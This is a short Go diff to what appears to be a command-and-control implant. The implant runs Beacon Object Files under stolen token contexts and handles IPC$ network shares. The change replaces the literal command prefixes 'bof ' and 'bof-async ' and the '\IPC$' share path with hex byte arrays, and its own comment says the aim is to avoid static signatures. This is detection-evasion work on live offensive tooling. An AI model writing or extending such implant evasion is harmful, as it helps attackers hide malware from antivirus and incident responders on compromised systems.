@@ -22,6 +22,13 @@ const (
 
 var (
 	bofExecutionMutex sync.Mutex
+
+	// BOF command prefixes (constructed to avoid static signatures)
+	bofAsyncCmdPrefix = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63, 0x20}) // bof-async
+	bofCmdPrefix      = string([]byte{0x62, 0x6f, 0x66, 0x20})                                     // bof
+
+	// Network share path
+	bofIPCShare = string([]byte{0x5c, 0x49, 0x50, 0x43, 0x24}) // \IPC$
 )
 
 // ensureTokenContextForBOF ensures the correct token context is applied for BOF execution
@@ -181,7 +188,7 @@ func executeBOFWithTokenContext(bofBytes []byte, args []byte) (string, error) {
 
 			// Also try IPC$ share
 			if idx := strings.Index(networkPath[2:], "\\"); idx > 0 {
-				ipcPath := networkPath[:idx+2] + "\\IPC$"
+				ipcPath := networkPath[:idx+2] + bofIPCShare
 				WNetCancelConnection2(ipcPath, 0, true)
 			}
 		}
@@ -288,9 +295,9 @@ func (cq *CommandQueue) processBOF(cmd Command) CommandResult {
 
 	// Parse any arguments that might be in the command
 	var bofArgs []byte
-	if cmd.Command != "" && strings.HasPrefix(cmd.Command, "bof ") {
+	if cmd.Command != "" && strings.HasPrefix(cmd.Command, bofCmdPrefix) {
 		// Extract arguments after "bof "
-		argString := strings.TrimPrefix(cmd.Command, "bof ")
+		argString := strings.TrimPrefix(cmd.Command, bofCmdPrefix)
 		if argString != "" {
 			// Parse the arguments using the lighthouse package format
 			parsedArgs, err := parseBOFArguments(argString)
@@ -524,8 +531,8 @@ func (cq *CommandQueue) handleChunkedBOFAsync(cmd Command) CommandResult {
 
 	// Parse arguments
 	var bofArgs []byte
-	if cmd.Command != "" && strings.HasPrefix(cmd.Command, "bof-async ") {
-		argString := strings.TrimPrefix(cmd.Command, "bof-async ")
+	if cmd.Command != "" && strings.HasPrefix(cmd.Command, bofAsyncCmdPrefix) {
+		argString := strings.TrimPrefix(cmd.Command, bofAsyncCmdPrefix)
 		if argString != "" {
 			args := strings.Fields(argString)
 			if len(args) > 0 {
